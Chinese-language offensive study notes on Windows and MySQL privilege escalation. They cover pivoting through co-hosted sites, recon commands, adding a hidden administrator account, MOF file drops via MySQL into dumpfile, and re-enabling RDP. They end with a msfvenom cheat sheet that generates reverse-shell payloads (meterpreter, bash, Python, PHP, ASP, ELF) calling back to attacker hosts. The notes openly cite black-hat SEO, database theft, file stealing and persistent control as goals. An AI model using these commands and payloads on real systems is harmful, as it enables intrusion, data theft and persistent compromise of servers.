提权相关

01-基础知识

  • 旁注、C段
    • 旁注：同服务器不同站点的渗透思路
    • C段：同网段不同服务器的渗透思路
    • 目标站点A无法直接渗透，这个时候我们可以采用旁注查询到目标站点A下的同服站点（同服务器下的其他站点），从而从旁渗透到目标站点（可能会涉及到提权）
    • 如果出现独立服务器（服务器只有一个站点），采用C段，通过查询IP段下的解析站点，渗透某一个服务器，继续进行内网渗透
  • Windows提权常见命令
    • Whoami 查看当前操作用户
    • Ipconfig ip地址获取命令
    • Net user用户操作命令
      • Net user xiaodi 123456 /add 添加用户名xiaodi，密码123456的用户
      • Net user xiaodi /del 删除用户xiaodi
      • Net localgroup administrators xiaodi /add 将用户xiaodi添加到本地管理员组
    • Tasklist /svc 进程获取命令
    • Netstat -ano 网络端口命令
    • Systeminfo 计算机信息获取命令

  • webshell权限和本机操作权限

    • Webshell权限小于本机操作权限

    • 图示

  • 不同平台下的webshell权限

    • IIS平台

    • Asp搭建软件

  • 提权技术分类

    • 溢出漏洞提权
    • 数据库提权
    • 第三方软件提权

  • 为什么要进行提权？

    • 做黑帽seo，修改网站首页文件，无权限修改
    • 做数据，无法获取所有数据，无权限脱裤
    • 做文件窃取，无法获取磁盘指定文件
    • 需要长期控制网站

02-windows提权

1.1 溢出漏洞提权演示

  1. 提权准备，信息收集

    • 操作系统版本，操作系统位数，补丁情况，有无防护软件

    • Systeminfo

      Windows2003 SP2 X86 32位操作系统 补丁情况：1个

    • Tasklist /svc

  2. 对比补丁及操作系统信息，筛选exp

  3. 利用exp进行执行提权

    • 寻找可读写目录，上传exp（注意：尽量不要带空格的目录

    • 调用执行exp

  4. 后续提权操作

    • 添加用户，登录远程连接端口

1.2-疑难问题及解决

  • 提权疑难问题：
    • Cmd无法执行
    • 3389无法连接
    • Exp执行失败

1.2.1-Cmd无法执行

  • 原因分析

    • cmd.exe被删除

    • cmd.exe被降权

    • 组件删除或禁用

      脚本代码要调用文件执行，需要对应的组件支持

    • 防护软件拦截
      例如：360，安全狗，D盾等

  • 绕过思路

    • 寻找可读写目录，上传本地cmd.exe，调用执行

1.2.2-3389无法连接

  • 原因一：端口被修改

    • 端口被修改

  • 解决

    • PID查询法

      • Tasklist /svc 获取对应进程pid号

      • Netstat -ano 获取指定pid号对应的端口开放情况

    • 端口扫描法

    • 注册表读取法

  • 原因2：端口被关闭

    • 解决：3389开启工具

  • 原因3：内网环境

    • 解决办法：端口转发

  • 原因4：防护软件拦截

03-Mysql提权

3.1-简介

  • 方法
    • Udf提权：功能型提权
    • Mof提权：漏洞型提权
    • 启动项提权：技巧型提权
  • mysql提权条件：获取最高用户root的密码
  • 获取方式：数据库配置文件、端口破解口令、下载数据库文件获取等
    • 数据库配置文件
      • Config，conn，data，sql，include，common，inc等命名文件
    • 口令猜解
      • Hscan，x-scan，hydra，破解脚本等
    • 数据库文件
      • 由于数据库文件同数据库本身结构一致，导致文件可读取数据
      • 由于root的帐号密码存储在数据库mysql下的user表，所以对应的目录地
        址../data/mysql/user.myd文件

3.3-利用mof提权

  • 前段时间国外Kingcope大牛发布了mysql远程提权 0day (MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)，剑心牛对MOF利用进行了分析，如下：

  • Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法

  • 第三种方法仅为向后兼容性与早期版本的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用

  • 具体到mysql提权中，我们又该怎么利用呢

    • 找一个可写目录 上传 mof文件，我这里上传到了 C:/wmpub/nullevt.mof 代码如下。

    • 执行load_file及into dumpfile把文件导出到正确的位置即可

      select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'

      • 执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。

05-msf简单使用

5-1msfvenom

  • MSF Payloads

    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
    • msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c

  • MSF 生成在 Linux 下反弹的 Meterpreter Shell

    • msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell

  • MSF 生成反弹 Shell (C Shellcode)

    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c

  • MSF 生成反弹 Python Shell

    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py

  • MSF 生成反弹 ASP Shell

    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp
    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp
    • root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform windows -o /root/shell.asp

  • MSF 生成反弹 Bash Shell

    • msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

  • MSF 生成反弹 PHP Shell

    • msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    • add <?php at the beginning
    • perl -i~ -0777pe's/^/<?php \n/' shell.php

  • MSF 生成反弹 Win Shell

    • msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
